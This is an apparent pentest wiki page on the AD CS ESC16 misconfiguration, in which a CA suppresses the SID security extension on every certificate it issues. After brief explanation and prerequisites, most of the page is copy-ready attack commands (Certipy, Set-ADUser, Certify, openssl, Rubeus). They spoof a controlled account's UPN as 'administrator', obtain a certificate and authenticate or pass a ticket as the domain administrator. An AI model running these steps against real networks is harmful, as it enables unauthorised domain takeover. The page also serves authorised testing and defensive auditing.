# ESC 16

{% hint style="info" %}
Security Extension Disabled Globally on the CA (No Security Extension - CA-wide, not per-template)
{% endhint %}

## Why It Works

* ESC9 disables the strong SID-binding security extension (`szOID_NTDS_CA_SECURITY_EXT`) on a **per-template** basis via `CT_FLAG_NO_SECURITY_EXTENSION`. ESC16 is the same weakness but applied **CA-wide**.
* The CA's `DisableExtensionList` registry value can be configured to include the security extension's OID (`1.3.6.1.4.1.311.25.2`), which suppresses that extension from **every certificate the CA issues**, regardless of per-template settings.
* This means the same UPN-spoofing attack described in ESC9 works against **any** Client Authentication-capable template on that CA - the attacker doesn't need to hunt for one specific vulnerable template; the entire CA is affected.
* Root cause is usually a misapplied compatibility setting (often introduced for legacy application support) that was never reverted.

## Prerequisites

* CA's `DisableExtensionList` includes the `szOID_NTDS_CA_SECURITY_EXT` OID (check via `certutil -config <CA> -getreg policy\\DisableExtensionList`).
* `StrongCertificateBindingEnforcement` on the DC(s) not set to full enforcement (`2`).
* Enrollment rights on any Client Authentication template, plus write access to your own/a victim account's `userPrincipalName`.

## Enumerate

```bash
certipy find -u <user>@<domain> -p <password> -dc-ip <DC-IP> -vulnerable -stdout
## Certipy flags ESC16 when the CA-wide DisableExtensionList suppresses the security extension
```

## Exploit

{% tabs %}
{% tab title="Certipy" %}
```bash
## Identical UPN-spoof pattern to ESC9, but any Client-Auth template on this CA is exploitable
certipy account update -u <user>@<domain> -p <password> -dc-ip <DC-IP> -user <controlled-account> -upn administrator
certipy req -u <controlled-account>@<domain> -p <password> -ca <CA-Name> -template <any-client-auth-template>
certipy account update -u <user>@<domain> -p <password> -dc-ip <DC-IP> -user <controlled-account> -upn <controlled-account>@<domain>
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```
{% endtab %}

{% tab title="PowerShell/RSAT + Certify + Rubeus" %}
```powershell
Set-ADUser -Identity <controlled-account> -UserPrincipalName administrator
Certify.exe request /ca:<CA-ServerDomain>\<CA-Username> /template:<any-client-auth-template>
Set-ADUser -Identity <controlled-account> -UserPrincipalName <controlled-account>@<domain>
openssl.exe pkcs12 -in esc16.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc16.pfx
Rubeus.exe asktgt /user:administrator /certificate:esc16.pfx /ptt
```
{% endtab %}
{% endtabs %}

### References

* [https://www.hackingarticles.in/adcs-esc16-security-extension-disabled-on-ca-globally/](https://www.hackingarticles.in/adcs-esc16-security-extension-disabled-on-ca-globally/)
